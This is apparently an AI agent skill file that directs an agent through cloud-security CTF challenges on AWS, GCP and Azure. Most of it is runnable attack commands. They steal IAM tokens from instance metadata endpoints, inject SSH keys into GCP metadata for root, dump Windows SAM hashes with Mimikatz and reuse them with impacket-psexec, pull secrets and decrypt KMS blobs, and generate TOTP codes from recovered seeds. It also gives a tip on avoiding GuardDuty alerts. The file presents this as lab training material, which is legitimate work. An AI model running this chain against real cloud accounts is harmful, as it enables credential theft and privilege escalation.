---
name: cloud-ctf
description: "Lab/CTF: cloud security challenges; AWS/GCP/Azure creds, buckets, IAM, metadata, KMS/secrets, snapshots, object versions, identity chains."
license: MIT
compatibility: "AgentSkills-compatible agents; authorized training and lab environments; aws-cli, gcloud, gsutil required."
metadata:
  author: AeonDave
  version: "1.1"
  category: ctf-solving
---
# Cloud CTF

Goal: solve cloud security CTF tasks by enumerating from a known entry point, confirming identity and permissions at every hop, and following the shortest validated path to the objective.

## When this skill applies

- Leaked AWS access key / secret key pair in a challenge description.
- AWS ARN unique ID (AROA, AIDA, ASIA, AKIA prefix) to resolve.
- GCP service account JSON key file provided.
- Azure credentials, tenant/subscription context, managed-identity shell, storage URL, SAS token, or Key Vault clue provided.
- SSH access to a cloud VM instance.
- Challenge involves S3/GCS/Blob buckets, IAM roles, KMS keys, EC2 snapshots, Firestore, WorkDocs, Secret Manager, or cloud metadata.

## Operating model

```
Entry point classification:
  A. AWS access key (AKIA.../ASIA...) → enumerate-iam → map services → pivot
  B. AWS unique ID (AROA/AIDA prefix) → resolve via IAM trust policy trick
  C. GCP service account key JSON → gcloud auth → enumerate roles → pivot
  D. Shell on cloud VM → IMDS metadata → credentials → enumerate
  E. Leaked URL / bucket name → anonymous access → authenticated list → versions
  F. Azure account/SAS/managed identity → az account show → role/scope/storage/key vault pivot

Loop:
  1. Identify and classify the entry point.
  2. Enumerate permissions with the smallest blast radius first.
  3. Map services accessible with current credentials.
  4. Pivot: recover deleted objects, assume roles, steal IMDS credentials.
  5. Repeat with each new credential set until the objective is reached.

Validation signal: flag value, decrypted file content, or secret value.
```

Do not brute-force services blindly — always start with identity confirmation and permission enumeration.

---

## Phase 0 — Entry point classification

### AWS unique ID resolution

AWS IAM unique IDs encode the principal type in the first 4 characters. When given an ID like `AROAXYAFLIG2BLQFIIP34`:

| Prefix | Principal type |
|--------|----------------|
| `AIDA` | IAM User |
| `AROA` | IAM Role |
| `ASIA` | Temporary session (STS) |
| `AKIA` | Long-term Access Key |
| `AGPA` | Group |
| `AIPA` | Instance Profile |
| `ANPA` | Managed Policy |

**Resolution technique**: create a free AWS account → IAM → Roles → Create role → Custom trust policy:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": {"AWS": "<UNIQUE_ID>"},
    "Action": "sts:AssumeRole"
  }]
}
```

Save it, then open the role → Trust relationships tab. AWS automatically resolves the unique ID to the full ARN. **The ARN is the answer.**

### AWS access key setup

```bash
aws configure
# Enter: access key, secret key, region (usually us-east-1), format (json)

# Always confirm identity first
aws sts get-caller-identity
```

### GCP service account key setup

```bash
gcloud auth activate-service-account --key-file=serviceaccount.json
gcloud config set project <project-id>
```

### Azure context setup

```bash
az account show
az account list --output table
az account set --subscription <subscription-id>
az role assignment list --assignee <object-id> --all
```

---

## Phase 1 — Permission enumeration

### AWS: enumerate-iam (blind permission discovery)

```bash
git clone https://github.com/andresriancho/enumerate-iam
python3 enumerate-iam.py --access-key AKIA... --secret-key <secret>
# For temporary credentials (ASIA):
python3 enumerate-iam.py --access-key ASIA... --secret-key <secret> --session-token <token>
```

Focus on `[INFO]` lines with `worked!`. High-value discoveries to act on immediately:

| Discovery | Next action |
|-----------|-------------|
| `s3.list_buckets` | List buckets, then check versioning |
| `ds.describe_directories` | Directory Service → WorkDocs |
| `ec2.describe_snapshots` | Snapshot forensics |
| `ec2.describe_instances` | Running VMs, instance profiles |
| `kms.list_keys` | KMS decryption |
| `secretsmanager.list_secrets` | Direct credential access |
| `cognito-identity.list_identity_pools` | Unauthenticated AWS credentials |
| `dynamodb.list_tables` | DynamoDB data enumeration |
| `sqs.list_queues` | Message queue access |
| `ecs.list_clusters` | Container task/credential access |
| `apigateway.get_rest_apis` | API discovery and API key extraction |
| `cloudtrail.describe_trails` | Activity log access |

### GCP: enumerate roles and permissions

```bash
# Try IAM policy (often denied, worth attempting)
gcloud projects get-iam-policy <project-id>

# List custom roles (frequently readable without broad permissions)
gcloud iam roles list --project <project-id>
gcloud iam roles describe <RoleName> --project <project-id>
```

Key permission to hunt for: `compute.instances.setMetadata` → privilege escalation.

### Azure: enumerate role scope and data-plane access

```bash
az account show
az role assignment list --assignee <object-id> --all --output table
az storage account list --output table
az keyvault list --output table
```

Separate management-plane roles from data-plane permissions. A principal that can see a storage account or vault may still need blob/key/secret-specific access to recover data.

---

## Phase 2 — Service-specific exploitation

### AWS Cognito Identity Pools — unauthenticated credentials

Cognito Identity Pools issue temporary AWS credentials. If a pool allows unauthenticated identities, the pool ID itself can become the next credential source.

```bash
# With current AWS credentials, if permission enumeration found list/describe access:
aws cognito-identity list-identity-pools --max-results 60
aws cognito-identity describe-identity-pool --identity-pool-id <region:uuid>

# With a known identity pool ID from app config or source code:
IDENTITY_ID=$(aws cognito-identity get-id \
  --identity-pool-id <region:uuid> \
  --no-sign-request \
  --query 'IdentityId' --output text)
aws cognito-identity get-credentials-for-identity \
  --identity-id "$IDENTITY_ID" \
  --no-sign-request
```

**CTF pattern:** `AllowUnauthenticatedIdentities: true` plus an over-permissive unauth role gives a fresh AWS credential set.

### AWS DynamoDB — table enumeration and scanning

```bash
aws dynamodb list-tables
aws dynamodb describe-table --table-name <table>
aws dynamodb scan --table-name <table> --limit 25
```

**CTF pattern:** Tables often contain credentials, Lambda configuration data, user records, or flag fragments.

### AWS SQS — queue enumeration and message retrieval

```bash
aws sqs list-queues
aws sqs get-queue-attributes --queue-url <url> --attribute-names All
aws sqs receive-message --queue-url <url> --max-number-of-messages 10 --visibility-timeout 0
```

**CTF pattern:** Queues and dead-letter queues often contain service-to-service tokens, job payloads, or flag fragments.

### AWS ECS — task definition secrets

```bash
aws ecs list-clusters
aws ecs list-task-definitions
aws ecs describe-task-definition --task-definition <family:revision>
```

**CTF pattern:** Task definitions expose environment variables, Secrets Manager references, image names, and IAM role assignments.

### AWS API Gateway — API and key discovery

```bash
aws apigateway get-rest-apis
aws apigatewayv2 get-apis
aws apigateway get-api-keys
aws apigateway get-api-key --api-key <id> --include-value
```

**CTF pattern:** API names, stages, Lambda integrations, and leaked API key values often identify the next web/API target.

### AWS CloudTrail — activity-log pivots

```bash
aws cloudtrail describe-trails
aws cloudtrail lookup-events --max-results 50
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=EventName,AttributeValue=AssumeRole \
  --max-results 50
```

**CTF pattern:** Activity logs reveal prior `AssumeRole`, `GetSecretValue`, `Decrypt`, and service-discovery calls that point to the intended chain.


### AWS S3 — versioning and deleted file recovery

```bash
aws s3 ls                                    # list accessible buckets
aws s3 ls s3://<bucket>/                     # list current contents

# Critical: deleted objects have preserved versions — always check
aws s3api list-object-versions --bucket <bucket>

# Recover a specific deleted version
aws s3api get-object \
  --bucket <bucket> --key <file> \
  --version-id <version-id> <output-file>
```

Deleted CSV files containing credentials are a common chain link.

### AWS WorkDocs — Directory Service exfiltration

```bash
# Find directory ID and WorkDocs access URL
aws ds describe-directories

# Enumerate document activity — reveals document IDs and names
aws workdocs describe-activities --organization-id <directory-id>

# Get document metadata (includes presigned download URLs)
aws workdocs get-document --document-id <doc-id>

# Download using the LARGE thumbnail URL from the response
curl '<LARGE_url_from_response>' --output document.png
```

### AWS Secrets Manager

```bash
aws secretsmanager list-secrets

# Get current version
aws secretsmanager get-secret-value --secret-id <name>

# List all versions (older versions often hold different credentials)
aws secretsmanager list-secret-version-ids --secret-id <name>
aws secretsmanager get-secret-value --secret-id <name> --version-id <id>
```

### AWS KMS — encrypted file decryption

```bash
aws kms list-keys
aws kms list-aliases
aws kms describe-key --key-id <key-id>

# Verify a file is KMS-encrypted:
# file <blob> → "Windows Precompiled iNF" means KMS envelope format

# Decrypt
aws kms decrypt \
  --ciphertext-blob fileb://./encrypted.file \
  --key-id <key-id>
# Response.Plaintext is base64 — decode:
echo "<base64_plaintext>" | base64 -d > decrypted.ps1
```

**Note**: the decrypted PS1 often embeds the next set of IAM credentials directly as hardcoded variables.

### AWS EC2 snapshot forensics

```bash
# Only list snapshots you own
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws ec2 describe-snapshots --filters Name=owner-id,Values=$ACCOUNT_ID

# Download snapshot as raw disk image
pip install dsnap
dsnap list
dsnap get <snap-id>        # outputs <snap-id>.img

# Inspect
file <snap-id>.img         # identifies filesystem (DOS/MBR, NTFS, etc.)

# Mount with guestfish
guestfish -a <snap-id>.img
><fs> run
><fs> list-filesystems
><fs> mount /dev/sda1 /
><fs> ll /
><fs> ll /WindowsImageBackup/          # Windows backup drive
><fs> copy-out '/WindowsImageBackup/<host>/Backup <date>/file.vhdx' /root/
```

**VHDX chain (Windows backup snapshots):**

```bash
# Mount the extracted VHDX
guestfish -a file.vhdx
><fs> run
><fs> list-filesystems   # usually /dev/sda2
><fs> mount /dev/sda2 /
><fs> ll /Windows/System32/config    # find SAM + SYSTEM
><fs> copy-out /Windows/System32/config/SAM /root/
><fs> copy-out /Windows/System32/config/SYSTEM /root/
```

**Hash extraction**: use **Mimikatz from Windows** (`lsadump::sam /system:... /sam:...`). `samdump2` on Linux returns null hashes for EC2 Windows instances.

**Pass-the-hash after extraction:**
```bash
impacket-psexec -hashes :<NTLM_hash> Administrator@<public-ip>
# → SYSTEM shell → query IMDS for next credentials
```

### IMDS credential theft (from inside a VM)

```bash
# AWS — find role name, then get temporary credentials
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# Save AccessKeyId + SecretAccessKey + Token to ~/.aws/credentials

# GCP
gcloud compute instances describe $(hostname)    # find attached SA
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

**IMDS credentials are temporary (ASIA prefix for AWS)** — always save the Token field too.

### GCP metadata injection — privilege escalation

Requires `compute.instances.setMetadata` permission:

```bash
NEWUSER="attacker"
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
echo "$NEWUSER:$(cat ./key.pub)" > meta.txt
gcloud compute instances add-metadata <instance-name> --metadata-from-file ssh-keys=meta.txt
# New user is automatically added to google-sudoers group
ssh -i ./key $NEWUSER@localhost
sudo cat /root/flag.txt
```

### GCP Storage — versioning and deleted file recovery

```bash
gcloud auth activate-service-account --key-file=key.json
gsutil ls                                          # list buckets
gsutil ls gs://<bucket>/                           # list contents
gsutil ls -a gs://<bucket>/<path>/                 # show ALL versions including deleted
gsutil cp 'gs://<bucket>/<path>#<generation>' .    # recover specific version
```

Config files deleted from buckets (`firestore.json`, `.env`) are a common chain link.

### GCP Firestore — collection dump

```javascript
// list-collections.js
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');
initializeApp({ credential: cert(require('./firestore.json')) });
const db = getFirestore();
db.listCollections().then(snap =>
  snap.forEach(s => console.log(s["_queryOptions"].collectionId))
);
```

```javascript
// dump-collection.js
const db = getFirestore();
async function dump() {
  const snap = await db.collection('<collection>').get();
  snap.forEach(doc => console.log(doc.id, '=>', doc.data()));
}
dump();
```

**Common data found**: `username`, bcrypt `password` hash, base32 `secret` (TOTP seed).

### TOTP bypass from recovered secret

```bash
# Any base32 string in recovered data is likely a TOTP seed
oathtool -b <BASE32_SECRET> --totp
python3 -c "import pyotp; print(pyotp.TOTP('<BASE32>').now())"
```

Combine with password reuse — try every recovered Secret Manager version as a login password before attempting to crack the bcrypt hash.

### Azure Storage and Key Vault pivots

Use [references/azure-service-cheatsheet.md](references/azure-service-cheatsheet.md) for command details. In CTF tasks, prioritize:

- Storage account/container listing, blob versions, soft-deleted blobs, snapshots, and SAS-token scope.
- Key Vault secret/key/certificate listing and older secret versions.
- Managed identity tokens from an isolated VM or container shell.
- Role assignments at subscription, resource group, resource, and data-plane scopes.

---

## Phase 3 — Credential pivoting

After every new credential set:
1. Confirm new identity.
2. Run `enumerate-iam` or `gcloud iam roles describe`.
3. Repeat Phase 2 with new permissions.

**Common multi-hop chains:**

```
AWS credential chain:
  AKIA#1 → s3:ListBuckets → list-object-versions → deleted CSV → AKIA#2
  AKIA#2 → ec2:DescribeSnapshots → dsnap → VHDX → Mimikatz → NTLM
  NTLM → impacket-psexec → SYSTEM → IMDS → ASIA (role with KMS)
  ASIA → kms:Decrypt → encrypted .ps1 → AKIA#3 embedded in plaintext
  AKIA#3 → secretsmanager:ListSecrets → flag or final secret

GCP credential chain:
  SA key (storage SA) → gsutil ls -a → deleted firestore.json
  firestore.json (Firestore SA) → list collections → user + TOTP seed
  SA key (storage SA) → gcloud secrets versions access v1 → reused password
  username + password(v1) + oathtool(seed) → web login → flag

ARN resolution:
  Unique ID (AROA...) → IAM trust policy trick → Trust relationships → ARN = flag
```

---

## Category-specific quick pivots

- **ARN unique ID given**: create IAM trust policy with the ID → view Trust relationships → AWS auto-resolves to full ARN.
- **Bucket challenge**: always run `list-object-versions` / `gsutil ls -a` first.
- **KMS challenge**: get role via IMDS from inside the EC2 instance; use that role to decrypt.
- **Snapshot challenge**: look for `WindowsImageBackup/` dir with `.vhdx`; Mimikatz not samdump2.
- **GCP metadata challenge**: find `compute.instances.setMetadata` in custom role → SSH key injection.
- **Multi-service chain**: draw the pivot graph before acting; document every identity and permission.
- **Password reuse**: try all recovered secrets (all SM versions) as login passwords before cracking.
- **TOTP**: any base32 string in recovered data is a TOTP seed — generate OTP immediately.
- **Azure SAS token**: parse permissions, resource type, expiry, and signed resource before assuming it grants list or read access.
- **Azure Key Vault**: check secret versions before treating the latest value as final.

## Technique integration

Load for deep methodology:
- `cloud-security-technique` — full enumeration workflows, IAM paths, detection-aware pivoting.

## Tool routing

- `aws-cli` for AWS identity, IAM, S3, KMS, Secrets Manager, EC2, DS, WorkDocs, and IMDS-assisted pivots.
- `gcloud-cli` for GCP IAM, Storage, Compute metadata, Secret Manager, Firestore, Functions, and GKE pivots.
- Azure CLI (`az`) for Azure account context, RBAC, Storage, Key Vault, and managed identity pivots.
- `pacu` when an AWS task needs broader permission mapping in an isolated lab.
- `gitleaks` and `trufflehog` when cloud credentials or service-account keys may be hidden in repositories or archives.
- `john`, `hashcat`, and TOTP tooling only after recovered secrets and password reuse have been tested.

## Quality gates

- Confirm identity before every service call.
- Run `list-object-versions` / `gsutil ls -a` before concluding a bucket is empty.
- Run `enumerate-iam` on every new credential set.
- Verify KMS file format with `file` utility before decrypting.
- Use Mimikatz (not samdump2) for EC2 Windows SAM.
- Record the pivot graph: identity → permission → service → output → next identity.

## Anti-patterns

- Skipping `list-object-versions` on S3/GCS buckets.
- Using samdump2 on EC2 Windows SAM → null hash output.
- Using IMDS credentials from your local machine → GuardDuty alert.
- Cracking bcrypt hashes before trying password reuse from recovered secrets.
- Treating `AccessDenied` as dead-end — try versioned objects, different key IDs, or other services.

## Resources

- [references/aws-service-cheatsheet.md](references/aws-service-cheatsheet.md) — quick CLI reference per AWS service (S3, KMS, STS, Secrets Manager, WorkDocs, EC2, DS).
- [references/gcp-service-cheatsheet.md](references/gcp-service-cheatsheet.md) — quick CLI reference for GCP (gsutil, gcloud, Firestore SDK, metadata injection).
- [references/azure-service-cheatsheet.md](references/azure-service-cheatsheet.md) — quick CLI reference for Azure identity, RBAC, Storage, Key Vault, and managed identity.
